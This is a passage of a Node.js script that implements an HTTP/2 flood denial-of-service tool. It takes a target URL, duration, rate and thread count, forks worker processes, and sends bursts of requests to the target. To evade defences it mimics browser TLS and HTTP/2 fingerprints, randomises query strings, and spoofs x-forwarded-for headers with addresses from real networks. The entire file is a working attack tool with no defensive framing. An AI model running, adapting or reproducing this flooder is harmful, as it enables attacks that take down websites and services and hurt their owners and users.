    crypto.constants.SSL_OP_PKCS1_CHECK_2 |
    crypto.constants.SSL_OP_SINGLE_DH_USE |
    crypto.constants.SSL_OP_SINGLE_ECDH_USE |
    crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;

if (process.argv.length < 6){
    console.log('Usage: node script.js <url> <time> <rate> <threads>');
    console.log('Example: node script.js https://example.com 60 64 10');
    process.exit();
}

const secureProtocol = "TLS_method";
const headers = {};
 
const secureContextOptions = {
    ciphers: ciphers,
    sigalgs: SignalsList,
    honorCipherOrder: true,
    secureOptions: secureOptions,
    secureProtocol: secureProtocol
};
 
const secureContext = tls.createSecureContext(secureContextOptions);
const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
}

const parsedTarget = url.parse(args.target);
const MAX_RAM_PERCENTAGE = 95;
const RESTART_DELAY = 1000;

if (cluster.isMaster) {
    console.log(`
╔════════════════════════════════════════════╗
║    HTTP/2 FLOOD - NO PROXY REQUIRED        ║
╚════════════════════════════════════════════╝`);
    console.log(`🎯 Target: ${args.target}`);
    console.log(`⏱️  Duration: ${args.time}s`);
    console.log(`⚡ Rate: ${args.Rate} req/s`);
    console.log(`👷 Threads: ${args.threads}`);
    console.log(`🚀 Protocol: HTTP/2`);
    console.log(`\n🔥 Starting attack...\n`);

    const restartScript = () => {
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }
        setTimeout(() => {
            for (let counter = 1; counter <= args.threads; counter++) {
                cluster.fork();
            }
        }, RESTART_DELAY);
    };

    const handleRAMUsage = () => {
        const totalRAM = os.totalmem();
        const usedRAM = totalRAM - os.freemem();
        const ramPercentage = (usedRAM / totalRAM) * 100;

        if (ramPercentage >= MAX_RAM_PERCENTAGE) {
            restartScript();
        }
    };
    
    setInterval(handleRAMUsage, 5000);
    
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
} else {
    setInterval(runFlooder, 1)
}

function runFlooder() {
    const parsedPort = parsedTarget.protocol == "https:" ? "443" : "80";

    const browsers = ["chrome", "safari", "brave", "firefox", "mobile", "opera", "operagx", "duckduckgo"];

    const getRandomBrowser = () => {
        const randomIndex = Math.floor(Math.random() * browsers.length);
        return browsers[randomIndex];
    };

    const transformSettings = (settings) => {
        const settingsMap = {
            "SETTINGS_HEADER_TABLE_SIZE": 0x1,
            "SETTINGS_ENABLE_PUSH": 0x2,
            "SETTINGS_MAX_CONCURRENT_STREAMS": 0x3,
            "SETTINGS_INITIAL_WINDOW_SIZE": 0x4,
            "SETTINGS_MAX_FRAME_SIZE": 0x5,
            "SETTINGS_MAX_HEADER_LIST_SIZE": 0x6
        };
        return settings.map(([key, value]) => [settingsMap[key], value]);
    };

    const h2Settings = (browser) => {
        const settings = {
            brave: [
                ["SETTINGS_HEADER_TABLE_SIZE", 65536],
                ["SETTINGS_ENABLE_PUSH", false],
                ["SETTINGS_MAX_CONCURRENT_STREAMS", 500],
                ["SETTINGS_INITIAL_WINDOW_SIZE", 6291456],
                ["SETTINGS_MAX_FRAME_SIZE", 16384],
                ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]
            ],
            chrome: [
                ["SETTINGS_HEADER_TABLE_SIZE", 4096],
                ["SETTINGS_ENABLE_PUSH", false],
                ["SETTINGS_MAX_CONCURRENT_STREAMS", 1000],
                ["SETTINGS_INITIAL_WINDOW_SIZE", 6291456],
                ["SETTINGS_MAX_FRAME_SIZE", 16384],
                ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]
            ],
            firefox: [
                ["SETTINGS_HEADER_TABLE_SIZE", 65536],
                ["SETTINGS_ENABLE_PUSH", false],
                ["SETTINGS_MAX_CONCURRENT_STREAMS", 100],
                ["SETTINGS_INITIAL_WINDOW_SIZE", 6291456],
                ["SETTINGS_MAX_FRAME_SIZE", 16384],
                ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]
            ],
            mobile: [
                ["SETTINGS_HEADER_TABLE_SIZE", 65536],
                ["SETTINGS_ENABLE_PUSH", false],
                ["SETTINGS_MAX_CONCURRENT_STREAMS", 500],
                ["SETTINGS_INITIAL_WINDOW_SIZE", 6291456],
                ["SETTINGS_MAX_FRAME_SIZE", 16384],
                ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]
            ],
            opera: [
                ["SETTINGS_HEADER_TABLE_SIZE", 65536],
                ["SETTINGS_ENABLE_PUSH", false],
                ["SETTINGS_MAX_CONCURRENT_STREAMS", 500],
                ["SETTINGS_INITIAL_WINDOW_SIZE", 6291456],
                ["SETTINGS_MAX_FRAME_SIZE", 16384],
                ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]
            ],
            operagx: [
                ["SETTINGS_HEADER_TABLE_SIZE", 65536],
                ["SETTINGS_ENABLE_PUSH", false],
                ["SETTINGS_MAX_CONCURRENT_STREAMS", 500],
                ["SETTINGS_INITIAL_WINDOW_SIZE", 6291456],
                ["SETTINGS_MAX_FRAME_SIZE", 16384],
                ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]
            ],
            safari: [
                ["SETTINGS_HEADER_TABLE_SIZE", 4096],
                ["SETTINGS_ENABLE_PUSH", false],
                ["SETTINGS_MAX_CONCURRENT_STREAMS", 100],
                ["SETTINGS_INITIAL_WINDOW_SIZE", 6291456],
                ["SETTINGS_MAX_FRAME_SIZE", 16384],
                ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]
            ],
            duckduckgo: [
                ["SETTINGS_HEADER_TABLE_SIZE", 65536],
                ["SETTINGS_ENABLE_PUSH", false],
                ["SETTINGS_MAX_CONCURRENT_STREAMS", 500],
                ["SETTINGS_INITIAL_WINDOW_SIZE", 6291456],
                ["SETTINGS_MAX_FRAME_SIZE", 16384],
                ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]
            ]
        };
        return Object.fromEntries(settings[browser]);
    };

    function brutalString(minLength = 6, maxLength = 12) {
        const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_~!@$%^&*";
        const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
        let str = "";
        for (let i = 0; i < length; i++) {
            str += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        return str;
    }

    function generateLegitIP() {
        const asnData = [
            { asn: "AS15169", country: "US", ip: "8.8.8." },
            { asn: "AS8075", country: "US", ip: "13.107.21." },
            { asn: "AS14061", country: "SG", ip: "104.18.32." },
            { asn: "AS13335", country: "NL", ip: "162.158.78." },
            { asn: "AS16509", country: "DE", ip: "3.120.0." },
            { asn: "AS14618", country: "JP", ip: "52.192.0." },
            { asn: "AS32934", country: "FR", ip: "13.37.0." },
            { asn: "AS4766", country: "KR", ip: "1.201.0." },
            { asn: "AS4134", country: "CN", ip: "101.226.0." }
        ];

        const data = asnData[Math.floor(Math.random() * asnData.length)];
        return `${data.ip}${Math.floor(Math.random() * 255)}`;
    }

    const browser = getRandomBrowser();
    const userAgent = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(115 + Math.random() * 10)}.0.${Math.floor(Math.random() * 5000)}.0 Safari/537.36`;

    const dynHeaders = {
        ":method": "GET",
        ":authority": parsedTarget.host,
        ":scheme": "https",
        ":path": parsedTarget.path + "?" + brutalString(4, 10) + "=" + brutalString(15, 25) + "&cb=" + Date.now(),
        "user-agent": userAgent,
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "accept-language": "en-US,en;q=0.9",
        "accept-encoding": "gzip, deflate, br",
        "x-forwarded-for": generateLegitIP(),
        "cache-control": "no-cache"
    };

    let h2_config;
    const h2settings = h2Settings(browser);
    h2_config = transformSettings(Object.entries(h2settings));

    // Direct TLS connection without proxy
    const tlsOptions = {
        ALPNProtocols: ["h2", "http/1.1"],
        ciphers: cipper,
        sigalgs: sigalgs,
        ecdhCurve: ecdhCurve,
        secureContext: secureContext,
        rejectUnauthorized: false,
        servername: parsedTarget.host,
        secureOptions: secureOptions,
    };
    
    const tlsSocket = tls.connect(parsedPort, parsedTarget.host, tlsOptions);
    
    tlsSocket.allowHalfOpen = true;
    tlsSocket.setNoDelay(true);
    tlsSocket.setKeepAlive(true, 60000);
    tlsSocket.setMaxListeners(0);
    
    let hpack = new HPACK();
    let client;
    
    tlsSocket.on('connect', () => {
        client = http2.connect(parsedTarget.href, {
            protocol: "https",
            createConnection: () => tlsSocket,
            settings: h2settings,
            socket: tlsSocket,
        });
        
        client.setMaxListeners(0);
        
        const updateWindow = Buffer.alloc(4);
        updateWindow.writeUInt32BE(Math.floor(Math.random() * (19963105 - 15663105 + 1)) + 15663105, 0);
        
        client.on('remoteSettings', (settings) => {
            const localWindowSize = Math.floor(Math.random() * (19963105 - 15663105 + 1)) + 15663105;
            client.setLocalWindowSize(localWindowSize, 0);
        });
        
        const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
        const frames = [
            Buffer.from(PREFACE, 'binary'),
            encodeFrame(0, 4, encodeSettings([...h2_config])),
            encodeFrame(0, 8, updateWindow)
        ];
        
        const intervalId = setInterval(async () => {
            const packed = Buffer.concat([
                Buffer.from([0x80, 0, 0, 0, 0xFF]),
                hpack.encode(dynHeaders)
            ]);
            
            const streamId = 1;
            
            if (tlsSocket && !tlsSocket.destroyed && tlsSocket.writable) {
                for (let i = 0; i < args.Rate; i++) {
                    const req = client.request(dynHeaders)
                        .on('response', response => {
                            req.close();
                            req.destroy();
                        });
                    req.end();
                    
                    const frame = encodeFrame(streamId, 1, packed, 0x1 | 0x4 | 0x20);
                    client.write(frame);
                }
            }
        }, 1000);
        
        client.on("close", () => {
            clearInterval(intervalId);
            client.destroy();
            tlsSocket.destroy();
        });

        client.on("error", () => {
            clearInterval(intervalId);
            client.destroy();
            tlsSocket.destroy();
        });
    });
    
    tlsSocket.on('error', () => {
        tlsSocket.destroy();
    });
}

const StopScript = () => process.exit(1);
setTimeout(StopScript, args.time * 1000);
